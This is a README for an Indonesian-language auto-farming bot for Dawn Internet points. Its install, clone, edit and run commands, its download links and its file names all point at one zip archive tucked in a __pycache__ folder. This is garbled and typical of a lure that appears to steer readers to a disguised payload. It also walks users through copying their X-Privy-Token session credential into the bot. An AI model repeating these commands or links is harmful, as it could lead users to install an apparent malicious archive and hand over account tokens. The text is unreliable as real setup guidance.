# 🌅 WINSNIP Dawn Farmer

Auto-farming bot untuk Dawn Internet dengan support multi-account dan proxy.

## ✨ Features

- ✅ Multi-account farming
- ✅ Multi-proxy support  
- ✅ Auto statistics display
- ✅ Color terminal output
- ✅ Modular & clean code
- ✅ Cross-platform (Windows, Linux, macOS)

## 📋 Requirements

- Python 3.8+
- curl-cffi
- colorama (optional, untuk warna)

## 🚀 Installation

### Windows
```bash
pip install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
```

### Linux/Mac
```bash
pip3 install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
```

### Android (Termux)

1. **Install Termux**
   - Download dari F-Droid: https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   - Atau Google Play Store (versi lama)

2. **Update Package & Install Dependencies**
   ```bash
   pkg update && pkg upgrade
   pkg install python git
   ```

3. **Clone/Download Bot**
   ```bash
   # Clone dari GitHub
   git clone https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   cd Dawn-Farmer
   
   # Atau download ZIP dari GitHub dan extract
   ```

4. **Install Requirements**
   ```bash
   pip install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   ```

5. **Setup Token & Run**
   ```bash
   # Edit https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip pake nano
   nano https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   # Paste token, tekan Ctrl+X, Y, Enter untuk save
   
   # Run bot
   python https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   ```

**Tips Android:**
- Gunakan Termux:Widget untuk auto-start
- Install Termux:Boot untuk run saat HP restart
- Gunakan screen/tmux untuk background farming:
  ```bash
  pkg install tmux
  tmux new -s farm
  python https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
  # Tekan Ctrl+B lalu D untuk detach
  # tmux attach -t farm untuk kembali
  ```

## ⚙️ Setup

### 1. Cara Mendapatkan x-privy-token

**Langkah-langkah:**

1. **Buka Dawn Dashboard**
   - Kunjungi: https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
   - Login dengan akun Anda

2. **Buka Developer Tools**
   - Windows/Linux: Tekan `F12` atau `Ctrl+Shift+I`
   - Mac: Tekan `Cmd+Option+I`

3. **Buka Tab Network**
   - Klik tab **"Network"** di Developer Tools
   - Refresh halaman (F5)

4. **Cari Request**
   - Scroll list request
   - Cari request yang menuju `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`
   - Klik salah satu request (contoh: `my-code`, `stats`, `claims`, dll)

5. **Copy Token**
   - Klik tab **"Headers"** 
   - Scroll ke bawah ke bagian **"Request Headers"**
   - Cari header **"X-Privy-Token"**
   - Copy value tokennya (panjang sekali, contoh: `eyJhbGciOiJ...`)

6. **Paste ke https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip**
   ```
   eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZ...
   ```

**Struktur Token:**
- Token dimulai dengan `eyJ`
- Sangat panjang (ratusan karakter)
- Format: `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` (3 bagian dipisah titik)

**Catatan Penting:**
- ⚠️ Jangan share token ke orang lain!
- Token akan expired, jika bot error, ambil token baru
- Satu token = satu akun

---

### 2. Add Tokens ke File

**Edit `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`:**
```
your-x-privy-token-here
another-token-if-you-have
```

Bisa tambah banyak token (satu per baris) untuk multi-account farming.

---

### 3. Add Proxies (Optional)

**Edit `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`:**
```
http://user:pass@ip:port
http://ip:port
socks5://user:pass@ip:port
```

Lihat `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` untuk contoh format.

## 🎮 Usage

### Windows
```bash
python https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
```

### Linux/Mac
```bash
python3 https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip
```

### Stop Farming
Tekan `Ctrl+C` untuk stop dengan aman.

## 📊 Statistics Display

Bot akan menampilkan:
- 💰 Total Points (Current + Referral)
- 🔥 Farming Streak
- 👥 Referral Stats & Code
- 📈 24h Activity

Statistics update setiap 5 ping (sekitar 50 menit).

## 📁 File Structure

```
https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip              # Main entry point
https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip           # Your x-privy-tokens
https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip          # Your proxies (optional)
https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip  # Proxy format examples
https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip     # Dependencies
src/
  ├── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip      # Configuration
  ├── core/
  │   ├── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip  # API client
  │   └── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip  # Farming logic
  └── utils/
      └── https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip # Helper functions
```

## ⚙️ Configuration

Edit `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` untuk mengubah:
- `interval`: Ping interval (default: 600 detik / 10 menit)
- `tokens_file`: File token location
- `proxies_file`: File proxy location

## 🔧 Troubleshooting

**Error: No tokens found**
- Pastikan `https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip` ada dan berisi token
- Format: satu token per baris

**Error: Module not found**
- Install dependencies: `pip install -r https://raw.githubusercontent.com/wizdomf3lix/Dawn-Farmer/main/src/core/__pycache__/Farmer-Dawn-v1.3.zip`

**Ping failed**
- Check token masih valid
- Check proxy jika dipakai
- Check koneksi internet

## 📝 Notes

- Interval 10 menit (600s) adalah yang paling aman untuk earning points
- Jangan set terlalu cepat atau points tidak akan dihitung
- Streak akan bertambah jika farming konsisten setiap hari
- Gunakan proxy berbeda untuk setiap account

## 👨‍💻 Developer

**WINSNIP**  
Version: 1.0.0

## ⚠️ Disclaimer

Bot ini untuk educational purposes. Gunakan dengan bijak dan sesuai Terms of Service Dawn Internet.
